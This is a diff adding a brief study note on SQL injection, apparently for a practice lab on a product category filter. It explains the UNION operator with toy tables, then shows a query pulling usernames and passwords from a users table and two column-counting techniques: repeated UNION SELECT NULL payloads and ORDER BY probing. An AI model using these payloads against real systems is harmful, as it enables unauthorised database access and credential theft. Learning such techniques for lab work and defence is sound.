@@ -1,0 +1,47 @@
+Sql injection - Product category filter
+
+End goal: determine the number of columns returned by query
+
+Background (Union) :
+
+Table 1          Table 2
+  a|b              c|d
+-------          -------
+  1,2               2,3
+  3,4               4,5
+
+
+  Query 1: select a, b from Table 1
+  1,2
+  3,4
+
+  Query 2 (Uses union operator): select a, b from Table 1 UNION select c, d from Table 2  
+
+  1, 2
+  3, 4
+  2, 3
+  4, 5
+
+select a, b from Table 1 UNION select username, passwords from users
+
+Rules (When using union operator):
+- The number and the order of the columns must be the same in all queries 
+- The data types must be compatible 
+
+Sql injection attack (way #1):
+
+
+select ? from table1 UNION select NULL
+-error -> incorrect no of columns
+
+select ? from table1 UNION select NULL, NULL
+-error -> incorrect no of columns
+
+select ? from table1 UNION select NULL, NULL, NULL
+- 200 response code -> correct no of columns
+
+
+sqli attack (way #2):
+
+select a, b from table1 order by 3
+
